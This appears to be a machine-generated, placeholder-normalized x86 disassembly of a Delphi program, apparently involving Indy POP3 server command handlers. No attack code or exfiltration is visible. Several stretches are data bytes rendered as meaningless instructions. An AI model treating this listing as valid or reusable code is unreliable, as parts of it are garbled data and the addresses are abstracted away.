add [ eax ] al
add bh bh
dec ebp
sub_46f0dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46f180
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov eax [ ebp - 0x8 ]
call sub_404310
test eax eax
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4040a4
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x22
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx 0x1
call sub_4045b0
push 0x1
push ebx
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f187
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404074
retn
sub_46f1ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404050
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46f1e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push j_sub_4039d0#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jle r-xdata
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407ddc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f279
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0x60 ]
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_46f280
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039d0#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4031dc
mov edi eax
mov eax esi
call sub_4031dc
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46f410
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46f47c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_46f44c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46f4b0
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax ebx
call sub_41476c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f310
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
sub_46f318
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46f3b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4031dc
cmp eax [ r-xdata ]
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
mov ecx esi
xor edx edx
mov eax edi
call sub_414ac4
mov [ edi + 0x2c ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a22c
mov [ edi + 0x28 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a22c
mov [ edi + 0x24 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f3ba
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_46f3ba
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46f3d8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_403294
mov eax [ esi + 0x24 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414afc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_46f4e8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46f592
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4031dc
mov edi eax
mov eax esi
call sub_4031dc
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46f410
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46f47c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_46f44c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46f4b0
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_46f5d4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_46f608
lea eax [ ebx + 0x48 ]
mov edx [ esi + 0x48 ]
call sub_4040a4
mov edx esi
mov eax ebx
call sub_46f280
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f599
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404074
retn
sub_46f5a0
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46f3d8
test bl bl
jle r-xdata
mov eax [ esi + 0x48 ]
call sub_408440
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_46f634
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039d0#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4031dc
mov edi eax
mov eax esi
call sub_4031dc
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46f410
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46f47c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_46f44c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46f4b0
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax ebx
call sub_46f280
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f6cf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
sub_46f6d8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46f3d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_46f708
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f744
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f74b
retn
mov eax rw-data
mov ecx 0x6
mov edx [ r-xdata ]
call sub_404acc
sub_46f750
push ebp
mov ebp esp
add esp 0xfffffff8
sub [ rw-data ] 0x1
jae r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_41392c
sub_46f780
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f7a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f7ac
retn
sub_46f7f7
dec [ ecx ]
add [ eax ] al
add [ ebp + edx * 2 + 0x6e ] bl
insd
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cli
clc
inc esi
add [ eax + eax ] bh
add [ eax + 0x5a ] dl
inc esi
add ah al
xor al 0x40
add [ eax - 0x2bffbe5b ] dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x4400470d ] ch
cmpsb [ esi ] [ edi ]
inc ecx
add [ ecx + esi + 0x6e640046 ] dh
inc esi
add [ eax - 0x53ffb9cf ] dh
xor [ esi ] eax
lodsb [ esi ]
insd
inc esi
add [ esi + ebp * 2 + 0x46 ] dh
add [ ebp + esi + 0x46 ] al
add [ eax ] dh
xor eax 0x6ec80046
inc esi
add [ ebp + ecx + 0x47 ] ah
add al dh
xor eax [ esi ]
push eax
xor al 0x46
add [ ebp + esi + 0x46 ] bl
add [ eax ] ch
xor [ esi ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
je r-xdata
add [ fs : eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] al
adc edx [ ecx + ecx * 2 + 0x64 ]
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax rw-data
mov ecx 0x4
mov edx [ r-xdata ]
call sub_404acc
inc esi
add [ ebx + 0x46f984c0 ] cl
add [ eax ] cl
pop ds
push esp
dec ecx
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
jb r-xdata
push esp
jb r-xdata
insd
inc ebp
jbe r-xdata
push 0x64616572
mov eax eax
adc al 0xf9
inc esi
add [ edi ] al
adc edx [ ecx + ecx * 2 + 0x64 ]
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
add [ eax + edx + 0x408d0040 ] ch
add [ edx + edi * 8 + 0x1c080046 ] ah
push esp
jb r-xdata
adc dl [ ecx + ecx * 2 + 0x64 ]
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
jae r-xdata
jne r-xdata
outsb
je r-xdata
popad
dec esi
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
sti
inc esi
add [ eax + 0x1 ] cl
add [ eax ] al
add al 0x5c
inc esi
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
jb r-xdata
push es
push 0x64616572
add al ch
pop edx
inc esi
add [ eax ] dl
stc
inc esi
push ebx
je r-xdata
push esp
dec ecx
inc ebx
outsd
insd
insd
popad
outsb
add [ fs : edx ] cl
jb r-xdata
dec esp
push esp
push 0x64616572
adc edx [ ecx + ecx * 2 + 0x64 ]
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
popad
or [ fs : edi ] al
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
cli
inc esi
add [ eax ] cl
sbb eax 0x50644954
pop es
dec ecx
outsb
add [ eax ] ecx
pop es
inc ecx
push ebx
outsb
jb r-xdata
bound esp [ ebp + 0x72 ]
inc ebp
jbe r-xdata
add [ fs : eax ] bl
push 0x64616572
movsb [ edi ] [ esi ]
clc
inc esi
add al ch
pop edx
inc esi
add [ eax ] al
add [ ecx + ecx * 2 ] cl
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
push ebp
jb r-xdata
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x4a3ffc0 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
sti
inc esi
add [ eax ] al
dec edi
push eax
inc ebx
outsd
insd
insd
inc ecx
dec esi
imul ebp [ esi + 0x67 ] 0x44410700
imul esp [ edi + 0x65 ] 0x53067473
outsb
inc ebp
jbe r-xdata
jb r-xdata
push eax
outsd
imul ebp [ bp ] 0x41070802
push esp
push 0x64616572
or eax 0x50644954
jb r-xdata
add [ eax + r-xdata ] dl
or [ 0x50644954 ] bl
jb r-xdata
pop eax
add [ eax ] bl
push esp
dec ecx
inc ebx
outsd
insd
insd
popad
outsb
push 0x64616572
or [ edi ] al
outsb
je r-xdata
inc ebx
jb r-xdata
stc
inc esi
jb r-xdata
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc edi
add [ eax + 0x48 ] dl
rcl ah 0xfb
inc esi
add [ edi ] al
or eax 0x50644954
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
add [ eax ] al
outsb
je r-xdata
inc ecx
mov esp 0x6c0041ac
inc edi
dec esp
imul ebp [ esi + 0x65 ] 0x6e490773
je r-xdata
jb r-xdata
dec ecx
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
imul ebp [ esi + 0x67 ] 0x46581800
add [ eax + edx + 0x10ac0040 ] ch
inc eax
add [ ebp - 0x55bffc0 ] cl
inc esi
add [ eax ] cl
sbb al 0x54
je r-xdata
push es
push ebx
push eax
dec edi
push eax
inc ebx
outsd
insd
insd
popad
outsb
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
sbb [ eax + 0x46 ] bl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x61fffc0 ] cl
inc esi
add [ eax ] cl
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
popad
dec esi
add [ ebx + 0x46f948c0 ] cl
add [ eax ] cl
sbb [ ecx + ecx * 2 + 0x64 ] edx
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
xor edx [ ebx + 0x65 ]
jb r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060020 ] al
outsb
push ebp
dec ecx
inc esp
dec esp
inc esp
stc
inc esi
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060021 ] al
outsb
push ebx
push esp
inc ecx
push esp
mov al [ 0x200046fa ]
add [ eax ] eax
jmp [ eax ]
stc
inc esi
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06001d ] al
outsb
dec esp
dec ecx
push ebx
push esp
cmp cl 0x46
add [ eax ] cl
add [ eax ] eax
jb r-xdata
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
add [ eax + 0x66 ] ah
inc esi
add [ eax - 0x5bffb99a ] al
lodsd [ esi ]
inc ecx
add [ esi + ebp * 4 - 0x4f33ffbf ] bl
inc ecx
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0xbffb8f4 ] al
fild [ ebp ]
sub al 0xe0
inc ebp
add [ eax + 0x45 ] bl
add [ eax - 0xbffb99d ] bh
arpl [ esi ] ax
sub al 0x64
inc esi
add [ eax - 0x3 ] dh
inc esi
add ah dl
inc si
add ah ch
push 0x68fc0046
inc esi
add [ ecx + ebp * 2 ] al
inc esi
add [ eax + 0x69 ] dl
inc esi
add [ ecx + ebp * 2 ] bl
inc esi
add [ 0x50644954 ] cl
dec edi
push eax
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
jb r-xdata
sbb [ eax + 0x46 ] bl
add [ eax + edx + 0x40 ] dl
popad
outsb
je r-xdata
inc ecx
dec ebp
popad
imul ebp [ edx + 0x6f ] 0x6444978
add [ edx ] cl
inc ecx
add [ ebx ] cl
outsd
insd
insd
popad
outsb
add [ fs : ebx ] cl
push esp
dec ecx
inc ebx
je r-xdata
jb r-xdata
jae r-xdata
arpl [ ebx + 0x55 ] bp
sti
inc esi
add ah al
pop esp
inc esi
add [ esi ] ah
add [ ecx + ecx * 2 ] cl
push eax
dec edi
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
add [ ebx ] cl
inc ecx
dec ebp
jae r-xdata
push esp
dec ecx
inc ebx
outsd
insd
insd
popad
outsb
add [ fs : ebx ] cl
add ecx [ eax ]
pop es
inc ecx
outsd
push eax
popad
jb r-xdata
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06001e ] al
jb r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx + 0x48500047 ] bh
popad
dec esi
jne r-xdata
dec ebp
jae r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x6e ] al
pop es
add [ ebx ] cl
inc esp
popa
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + 0x66 ] bl
inc esi
add [ eax + eax ] dl
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi ] 0x0
add [ edi ] al
pop es
dec ecx
outsb
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06001f ] al
stc
inc esi
je r-xdata
add [ edx + esi ] ch
jb r-xdata
outsb
push edx
inc ebp
push esp
push edx
cmp cl 0x46
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ esi ] al
dec edi
outsd
jb r-xdata
jne r-xdata
or [ ecx + 0x4e ] eax
outsb
inc esp
inc ebp
dec esp
inc ebp
cmp cl 0x46
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ esi ] al
dec edi
fdiv st1
inc esi
add al bh
add [ eax ] al
sub_47061c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_470719
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x1c ]
mov esi edi
cmp [ esi + 0x78 ] 0x0
jne r-xdata
mov eax [ edi + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x142 ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x18 ]
push eax
mov eax r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
lea edx [ ebp - 0x20 ]
xor ecx ecx
pop eax
call sub_408d10
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40435c
mov edx [ ebp - 0x10 ]
mov eax [ edi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx 0x1
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov edx ebx
mov eax [ edi + 0x144 ]
call [ edi + 0x140 ]
cmp [ esi + 0x78 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470720
lea eax [ ebp - 0x18 ]
mov edx 0x5
call sub_404074
retn
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
sub_47077d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
xor edx edx
push ebp
push j_sub_4039d0#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x1c ]
cmp [ edx + 0x78 ] 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0xc ]
push eax
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x14 ]
xor ecx ecx
pop eax
call sub_408d10
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40435c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
mov esi eax
mov edx ebx
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47083f
sub_470888
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
xor edx edx
push ebp
push sub_470940
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x1c ]
cmp [ edx + 0x78 ] 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
cmp [ eax + 0x13a ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0xc ]
push eax
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x14 ]
xor ecx ecx
pop eax
call sub_408d10
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40435c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
mov esi eax
mov edx ebx
mov eax [ esi + 0x13c ]
call [ esi + 0x138 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470947
sub_470990
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4039d0#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x1c ]
mov eax esi
cmp [ eax + 0x78 ] 0x1
jne r-xdata
mov eax [ esi + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x28 ]
push eax
mov eax r-xdata
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x30 ]
xor ecx ecx
pop eax
call sub_408d10
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_40435c
mov edx [ ebp - 0x20 ]
mov eax [ esi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_407e14
mov eax [ ebp - 0x8 ]
or edx 0xffffffff
call sub_4080c0
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470af0
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx 0x1
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_407e14
mov eax [ ebp - 0x10 ]
or edx 0xffffffff
call sub_4080c0
inc eax
je r-xdata
lea ecx [ ebp - 0x18 ]
mov edx 0x1
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_408084
push eax
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
call sub_408084
mov ecx eax
mov esi [ ebp - 0x4 ]
mov edx ebx
mov eax [ esi + 0x124 ]
call [ esi + 0x120 ]
jmp r-xdata
sub_470b50
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_470c31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x78 ] 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
cmp [ esi + 0x11a ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x14 ]
push eax
mov eax r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
lea edx [ ebp - 0x1c ]
xor ecx ecx
pop eax
call sub_408d10
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40435c
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407e14
mov eax [ ebp - 0x4 ]
or edx 0xffffffff
call sub_4080c0
mov ecx eax
mov edx ebx
mov eax [ esi + 0x11c ]
call [ esi + 0x118 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470c38
sub_470c80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46620c
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
mov edx 0x6e
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ esi + 0x7c ]
mov eax [ eax + 0x10 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ esi + 0xf4 ]
mov eax [ eax + 0x10 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_470d1b
[ ebx ]
add [ eax ] al
add [ 0x20525245 ] ch
push ebx
outsd
jb r-xdata
add [ eax ] al
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
jns r-xdata
mov eax esi
call sub_4035f0
and [ ebp + 0x6e ] dl
imul ebp [ esi + 0x6f ] 0x77
outsb
and [ ebx + 0x6f ] al
insd
insd
popad
outsb
add [ fs : ebx + 0x56 ] dl
call sub_403608
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4662e8
test bl bl
jle r-xdata
pop esi
pop ebx
